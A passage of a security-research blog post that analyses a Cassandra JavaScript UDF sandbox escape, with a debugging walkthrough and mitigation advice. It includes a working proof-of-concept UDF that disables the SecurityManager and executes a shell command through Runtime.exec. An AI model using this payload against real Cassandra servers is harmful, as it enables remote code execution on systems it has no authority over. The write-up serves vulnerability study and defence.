<p>Here a constructor initializes a <code class="language-plaintext highlighter-rouge">ScriptBasedUDFunction</code> instance by compiling the script, performing necessary checks &amp; security measures and setting up the execution context. First it checks if the language specified is <code class="language-plaintext highlighter-rouge">JavaScript</code> and if the <code class="language-plaintext highlighter-rouge">scriptEngine</code> is not <code class="language-plaintext highlighter-rouge">null</code>, If the language is invalid or the <code class="language-plaintext highlighter-rouge">scriptEngine</code> is <code class="language-plaintext highlighter-rouge">null</code> it throws an <code class="language-plaintext highlighter-rouge">InvalidRequestException</code> with an appropriate error message. Then, it attempts to compile the body of the script using the <code class="language-plaintext highlighter-rouge">scriptEngine</code>and compilation is executed with no permissions to prevent potentially malicious code from running, such as code in <code class="language-plaintext highlighter-rouge">static code blocks</code> or during class initialization &amp; it’s done by using <code class="language-plaintext highlighter-rouge">AccessController.doPrivileged()</code> with a <code class="language-plaintext highlighter-rouge">PrivilegedExceptionAction</code> that compiles the script. Finally, <code class="language-plaintext highlighter-rouge">accessControlContext</code> is used as the access control context for this privileged action If an exception occurs during the compilation process an <code class="language-plaintext highlighter-rouge">InvalidRequestException</code> is thrown with a formatted error message. After that an instance of <code class="language-plaintext highlighter-rouge">UDFContextWrapper</code> is created and assigned to the <code class="language-plaintext highlighter-rouge">udfContextBinding</code> variable and it serves as a binding for the script execution context.</p>

<p><img src="/assets/images/66e0e7bd597ad09128ff21b7e4ba16dc" alt="" /></p>

<p> </p>

<p>In this code section it first returns the <code class="language-plaintext highlighter-rouge">executor</code> instance which is an <code class="language-plaintext highlighter-rouge">ExecutorService</code> used for executing tasks asynchronously in the codebase. Then, we have <code class="language-plaintext highlighter-rouge">executeUserDefined()</code> function prepares the parameters &amp; execute the <code class="language-plaintext highlighter-rouge">UDF</code> script and converts the result into a <code class="language-plaintext highlighter-rouge">ByteBuffer</code> to be returned.</p>

<p><img src="/assets/images/5ad7c81676d4c43d9719d1b9ad68fe93" alt="" /></p>

<p> </p>

<p>Then <code class="language-plaintext highlighter-rouge">executeAggregateUserDefined()</code> function prepares the parameters &amp; call the <code class="language-plaintext highlighter-rouge">executeScriptInternal()</code> method with the prepared parametersand return the result of executing the <code class="language-plaintext highlighter-rouge">UDF</code>aggregate function.</p>

<h2 id="enable_user_defined_functions_threads"><strong>enable_user_defined_functions_threads</strong></h2>

<p>The <code class="language-plaintext highlighter-rouge">enable_user_defined_functions_threads</code> is a configuration option and when it’s enabled, <code class="language-plaintext highlighter-rouge">UDF</code> execution is offloaded to a dedicated thread pool which allowing <code class="language-plaintext highlighter-rouge">UDFs</code> to be executed concurrently with other queries. And the main problem is here cause when this option is disabled the <code class="language-plaintext highlighter-rouge">UDF</code> runs in the daemon thread, As a results we has permissions to call <code class="language-plaintext highlighter-rouge">setSecurityManager</code> which allow us to disable the security manager in cassandra, As a results we will be able to bypass the class filtering and we will be able to include critical or blacklisted calsses to execute codes on the system as when we running the <code class="language-plaintext highlighter-rouge">JS</code> code in <code class="language-plaintext highlighter-rouge">Nashron</code> we can access <code class="language-plaintext highlighter-rouge">Nashorn</code> instance engine, through the access we have to the engine property. We can find the implementation of <code class="language-plaintext highlighter-rouge">SecurityManager</code> at the following class <code class="language-plaintext highlighter-rouge">src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java</code> the class is providing a mechanism for controlling and enforcing security permissions in <code class="language-plaintext highlighter-rouge">Cassandra</code> which allowing fine-grained access control for different operations and resources.</p>

<h1 id="exploitation"><strong>Exploitation</strong></h1>

<p>It’s the time to see how we can exploit the vulnerability before do our dynamic analysis on it. So, we be able to understand what we are debugging or analysis dynamically.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE KEYSPACE test WITH replication = {'class': 'SimpleStrategy', 'replication_factor' : 3};
use test;
CREATE TABLE tab (cmd text PRIMARY KEY) WITH comment='Important biological records';
create or replace function test.exec(name text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$
var System = Java.type("java.lang.System");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("touch /tmp/Pwn3d.txt")');name $$;
insert into tab(cmd) values('test');
select exec(cmd) from tab;
</code></pre></div></div>

<p>This <code class="language-plaintext highlighter-rouge">UDF</code> will run in a daemon thread as the <code class="language-plaintext highlighter-rouge">enable_user_defined_functions_threads</code> option is disabled, As a results we can have permissions to control <code class="language-plaintext highlighter-rouge">setSecurityManager</code> and we can see in the <code class="language-plaintext highlighter-rouge">UDF</code> we set it to null so we can bypass the class filteration &amp; with the access to engine property we create a new engine instance and call <code class="language-plaintext highlighter-rouge">eval()</code> function from <code class="language-plaintext highlighter-rouge">JS</code> &amp; finally, Our <code class="language-plaintext highlighter-rouge">JAVA</code> code in it to execute a command using <code class="language-plaintext highlighter-rouge">Runtime</code> from <code class="language-plaintext highlighter-rouge">Java</code>. In our case, The code will create a file named <code class="language-plaintext highlighter-rouge">Pwn3d.txt</code> under the <code class="language-plaintext highlighter-rouge">/tmp</code> directory on the server as a <code class="language-plaintext highlighter-rouge">PoC</code>. Let’s Run the <code class="language-plaintext highlighter-rouge">UDF</code> and check it out:</p>

<p><img src="/assets/images/6b7aff97bceb750b4919b7cef5e396bd" alt="" /></p>

<h1 id="dynamic-analysis"><strong>Dynamic Analysis</strong></h1>

<p>Now, We under stand how is the <code class="language-plaintext highlighter-rouge">Nashorn</code> is implemented, How the <code class="language-plaintext highlighter-rouge">UDFs</code> get executed the security manager &amp; the class filtering mechanism. It’s time to see the <code class="language-plaintext highlighter-rouge">UDFs</code> run in action and in the default settings while we debug it &amp; see the difference dynamically when the security manager is on &amp; When it’s off. We already configured the debugger before when we were setting up our testing lab. Note: For debugging people may face problems when debugging on docker, So we gonna build <code class="language-plaintext highlighter-rouge">cassandra</code> easily and debug it locally from the <code class="language-plaintext highlighter-rouge">kali</code> machine. First download <code class="language-plaintext highlighter-rouge">Cassandra-4.0.0</code> from <a href="https://github.com/apache/cassandra/releases/tag/cassandra-4.0.0">here</a>. Now, extract it and install apache <code class="language-plaintext highlighter-rouge">ant</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install ant
</code></pre></div></div>

<p>Now, let’s build <code class="language-plaintext highlighter-rouge">Cassandra</code> by using <code class="language-plaintext highlighter-rouge">ant</code> command:</p>

<p> </p>

<p><img src="/assets/images/b3d98949b826e6ded237155502d1cfd8" alt="" /></p>

<p> </p>

<p>After building is done, Let’s enable debugging by exporting the following variable in our environmenrt:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export JVM_EXTRA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1414"
</code></pre></div></div>

<p> </p>

<p><img src="/assets/images/88aa140a54b34b17a6182319fa21c4b8" alt="" /></p>

<p> </p>

<p>Before we run the app let’s edit the options in <code class="language-plaintext highlighter-rouge">cassandra.yaml</code> file under the <code class="language-plaintext highlighter-rouge">conf</code> directory &amp; add the following options:</p>

<p> </p>

<p><img src="/assets/images/46966a024e7336f5bf6e2e5b41dc17f6" alt="" /></p>

<p>Now, Run <code class="language-plaintext highlighter-rouge">Cassandra</code> using <code class="language-plaintext highlighter-rouge">./bin/cassandra</code>:</p>

<p> </p>

<p><img src="/assets/images/fc1887398d44f7823e8670b69fca7e10" alt="" /></p>

<p> </p>

<p>The app is running, go to <code class="language-plaintext highlighter-rouge">Run</code> Tab and then click on <code class="language-plaintext highlighter-rouge">Edit Configurations</code>:</p>

<p> </p>

<p><img src="/assets/images/1c61f6f4605d01e3ca60d6572b7a7c20" alt="" /></p>

<p> </p>

<p>Then Click on the <code class="language-plaintext highlighter-rouge">+</code> add sign and choose <code class="language-plaintext highlighter-rouge">Remote JVM Debug</code>:</p>

<p> </p>

<p><img src="/assets/images/a10d9e442d9dd36639ae044263dc5133" alt="" /></p>

<p> </p>

<p>And Name it as you want &amp; configure the remote debugger, By adding the machine <code class="language-plaintext highlighter-rouge">IP</code>, Debugging port which is <code class="language-plaintext highlighter-rouge">1414</code>:</p>

<p> </p>

<p><img src="/assets/images/c44ddbf21db95506cddb437d7c8a54b9" alt="" /></p>

<p> </p>

<p>Finally, Let’s Set the breakpoint on the <code class="language-plaintext highlighter-rouge">private static final UDFExecutorService executor</code> inside of <code class="language-plaintext highlighter-rouge">src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java</code> class.</p>

<p> </p>

<p><img src="/assets/images/ffdd996f0d8526a238f4e551ad3b29df" alt="" /></p>

<p> </p>

<p>Now, Let’s click on the debugging button</p>

<p> </p>

<p><img src="/assets/images/96d9faea99bf7a8f76d33ee09836eb9f" alt="" /></p>

<p> </p>

<p> </p>

<p><img src="/assets/images/f99c6e7b3b0448cd71e1359f443d8612" alt="" /></p>

<p> </p>

<p>Next, execute our <code class="language-plaintext highlighter-rouge">UDF</code> again:</p>

<p> </p>

<p><img src="/assets/images/d3f17d79c90f76f972c3eb6554419f2d" alt="" /></p>

<p> </p>

<p>As you can see because we set the <code class="language-plaintext highlighter-rouge">enable_user_defined_functions_threads</code> otpion to <code class="language-plaintext highlighter-rouge">true</code>, The <code class="language-plaintext highlighter-rouge">UDF</code> not running in a daemon thread. Therefor, We don’t have the permissions to control <code class="language-plaintext highlighter-rouge">setSecurityManager</code>. So, We got this execption massege.</p>

<p> </p>

<p><img src="/assets/images/7f76716da9a50302d1ef3563905c440d" alt="" /></p>

<p> </p>

<p>When we go to our debugger here clearly we have the members of <code class="language-plaintext highlighter-rouge">ScriptBasedUDFunction</code> which are:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>protectionDomain = null
accessControlContext = null
allowedPackagesArray = {String[34]@7856} ["", "com", "edu", "java", "javax", +29 more]
executor = null
classFilter = null
scriptEngine = null
logger = {Logger@7857} "Logger[org.apache.cassandra.cql3.functions.UDFunction]"
threadMXBean = {ThreadImpl@7858} 
allowedPatterns = {String[21]@7859} ["com/google/comm...", "java/io/IOExcep...", "java/io/Seriali...", "java/lang/", "java/math/", +16 more]
disallowedPatterns = {String[34]@7860} ["com/datastax/dr...", "com/datastax/dr...", "com/datastax/dr...", "com/datastax/dr...", "com/datastax/dr...", +29 more]
udfClassLoader = {UDFunction$UDFClassLoader@7861} 
$assertionsDisabled = false
NAME_COMPARATOR = {SchemaElement$lambda@7862} 
</code></pre></div></div>

<p> </p>

<p><img src="/assets/images/1b14278dcc59dd26c1accba732562d10" alt="" /></p>

<p> </p>

<p>Here we can see it executed the <code class="language-plaintext highlighter-rouge">ScriptBasedUDFunction()</code> function under <code class="language-plaintext highlighter-rouge">UDFunction</code> class implementation as the language is <code class="language-plaintext highlighter-rouge">JavaScript</code> &amp; We can see that the body is carrying our function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>body= var System = Java.type("java.lang.System");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("touch /tmp/Pwn3d.txt")');name 
</code></pre></div></div>

<p> </p>

<p><img src="/assets/images/83970774c1ba34bce93c34f9fdb1c8e7" alt="" /></p>

<p> </p>

<p>After that it starts to create our <code class="language-plaintext highlighter-rouge">UDF</code> using <code class="language-plaintext highlighter-rouge">create</code> method. And it’s passing the needed parameters as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this = {CreateFunctionStatement@7887} "CreateFunctionStatement (test, exec)"
 functionName = "exec"
 argumentNames = {ArrayList@7880}  size = 1
 rawArgumentTypes = {ArrayList@7937}  size = 1
 rawReturnType = {CQL3Type$Raw$RawType@7938} "text"
 calledOnNullInput = false
 language = "javascript"
 body = "\nvar System = Java.type("java.lang.System");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("touch /tmp/Pwn3d.txt")');name "
 orReplace = true
 ifNotExists = false
 keyspaceName = "test"
schema = {Keyspaces@7888} "[KeyspaceMetadata{name=system_schema, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.LocalStrategy}}, tables=[system_schema.keyspaces, system_schema.tables, system_schema.columns, system_schema.triggers, system_schema.dropped_columns, system_schema.views, system_schema.types, system_schema.functions, system_schema.aggregates, system_schema.indexes], views=[], functions=[], types=[]}, KeyspaceMetadata{name=system, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.LocalStrategy}}, tables=[system."IndexInfo", system.batches, system.paxos, system.local, system.peers_v2, system.peers, system.peer_events_v2, system.peer_events, system.compaction_history, system.sstable_activity, system.size_estimates, system.table_estimates, system.available_ranges_v2, system.available_ranges, system.transferred_ranges_v2, system.transferred_ranges, system.view_bu"
 keyspaces = {RegularImmutableMap@7940}  size = 6
 tables = {RegularImmutableMap@7941}  size = 41
keyspace = {KeyspaceMetadata@7889} "KeyspaceMetadata{name=test, kind=REGULAR, params=KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.SimpleStrategy, replication_factor=3}}, tables=[test.tab], views=[], functions=[], types=[]}"
 name = "test"
 kind = {KeyspaceMetadata$Kind@7943} "REGULAR"
 params = {KeyspaceParams@7944} "KeyspaceParams{durable_writes=true, replication=ReplicationParams{class=org.apache.cassandra.locator.SimpleStrategy, replication_factor=3}}"
 tables = {Tables@7945} "[test.tab]"
 views = {Views@7946} "[]"
 types = {Types@7947} "[]"
 functions = {Functions@7948} "[]"
argumentTypes = {ArrayList@7881}  size = 1
 0 = {UTF8Type@7882} "org.apache.cassandra.db.marshal.UTF8Type"
returnType = {UTF8Type@7882} "org.apache.cassandra.db.marshal.UTF8Type"
 reverseComparator = {AbstractType$lambda@7922} 
 comparisonType = {AbstractType$ComparisonType@7923} "BYTE_ORDER"
 isByteOrderComparable = true
 comparatorSet = {ValueComparators@7924} 
argumentNames = {ArrayList@7880}  size = 1
 0 = {ColumnIdentifier@7919} "name"
functionName = "exec"
 value = {char[4]@7935} [e, x, e, c]
 hash = 0
</code></pre></div></div>

<p> </p>

<p><img src="/assets/images/a0d10de9d419f332b06e2a9a714cacb1" alt="" /></p>

<p> </p>

<p>Moving forward it will go to the <code class="language-plaintext highlighter-rouge">src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java</code> class to start performing the security checks using <code class="language-plaintext highlighter-rouge">isSecuredThread()</code> that checks if the current thread is a secured thread. Now, Let’s disable the <code class="language-plaintext highlighter-rouge">enable_user_defined_functions_threads</code> and see how the function will get executed while we debugging:</p>

<p> </p>

<p><img src="/assets/images/b79ac406f5599c07cfd7ba73e46141f5" alt="" /></p>

<p> </p>

<p>Then restart <code class="language-plaintext highlighter-rouge">Cassandra</code> and start to debug, When we start to debug it will do the same previous, But when we arrive here:</p>

<p> </p>

<p><img src="/assets/images/08a09c56a095c946e20c59996862b79f" alt="" /></p>

<p> </p>

<p>it’s checking if the current thread is running in a secured thread group <code class="language-plaintext highlighter-rouge">SecurityThreadGroup</code> and returns <code class="language-plaintext highlighter-rouge">true</code> if the thread has been previously initialized as secured or <code class="language-plaintext highlighter-rouge">false</code> if it’s not running in a secured thread group or has not been initialized yet. But, In our case it will return <code class="language-plaintext highlighter-rouge">false</code>.</p>

<p> </p>

<p><img src="/assets/images/a9352fe96efeb55dd882e61616336e7a" alt="" /></p>

<p> </p>

<p>Here when it’s come to check if the thread results is <code class="language-plaintext highlighter-rouge">true</code>, Then it will throw execption tells us that access denied. But, This time will not as the the <code class="language-plaintext highlighter-rouge">UDF</code> running as a daemon thread and we set the <code class="language-plaintext highlighter-rouge">securityManager</code> to null. As a results it will execute our <code class="language-plaintext highlighter-rouge">UDF</code> successfully.</p>

<h1 id="mitigation"><strong>Mitigation</strong></h1>

<p>The vulnerability is only avlilable under the configurations we configure <code class="language-plaintext highlighter-rouge">Cassandra</code> on, To mitigate this <code class="language-plaintext highlighter-rouge">CVE</code> we have to set <code class="language-plaintext highlighter-rouge">enable_user_defined_functions_threads</code> option to true to prevent the <code class="language-plaintext highlighter-rouge">UDF</code> from running as a daemon thread &amp; If you not using <code class="language-plaintext highlighter-rouge">UDFs</code> you better disable it. You can use this remedy script on <code class="language-plaintext highlighter-rouge">Vsociety</code> from here to help you with that.</p>

<p> </p>

<p>Mitigation Video: https://ibb.co/GpQzPTd</p>

<h1 id="conclusion"><strong>Conclusion</strong></h1>

<p>In a short way, We analyzed the vulnerability&amp; the root-cause, The <code class="language-plaintext highlighter-rouge">UDFs</code>, <code class="language-plaintext highlighter-rouge">Nashron</code>, <code class="language-plaintext highlighter-rouge">SecurityManager</code> &amp; more. We saw how <code class="language-plaintext highlighter-rouge">UDFs</code> created and executed &amp; How under a certien configurations the <code class="language-plaintext highlighter-rouge">Cassandra</code> can be vulnerable for the <code class="language-plaintext highlighter-rouge">CVE</code>. Finally, How it could be used to bypass all the security implementations and achieve remote code execution on the target host.</p>

<h1 id="resources"><strong>Resources</strong></h1>

<ul>
  <li>
    <p>https://github.com/apache/cassandra/releases/tag/cassandra-4.0.0</p>
  </li>
  <li>
    <p><a href="https://cassandra.apache.org/doc/latest/cassandra/troubleshooting/use_tools.html">https://cassandra.apache.org/doc/latest/cassandra/troubleshooting/use_tools.html</a></p>
  </li>
  <li>
    <p>https://murukeshm.github.io/cassandra/3.11.3/development/ide.html</p>
  </li>
  <li>
    <p>https://ant.apache.org/manual/install.html</p>
  </li>
  <li>
    <p><a href="https://cassandra.apache.org/_/index.html">https://cassandra.apache.org/_/index.html</a></p>
  </li>
  <li>
    <p><a href="https://cassandra.apache.org/_/quickstart.html">https://cassandra.apache.org/_/quickstart.html</a></p>
  </li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#security-research" class="page__taxonomy-item" rel="tag">Security Research</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-05-28T00:00:00+08:00">May 28, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/security%20research/CVE_2021_45232/" class="pagination--pager" title="CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp; Unauth-RCE
">Previous</a>
    
    
      <a href="/security%20research/CVE_2021_38294/" class="pagination--pager" title="CVE-2021-38294: Apache Storm Nimbus Command Injection
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
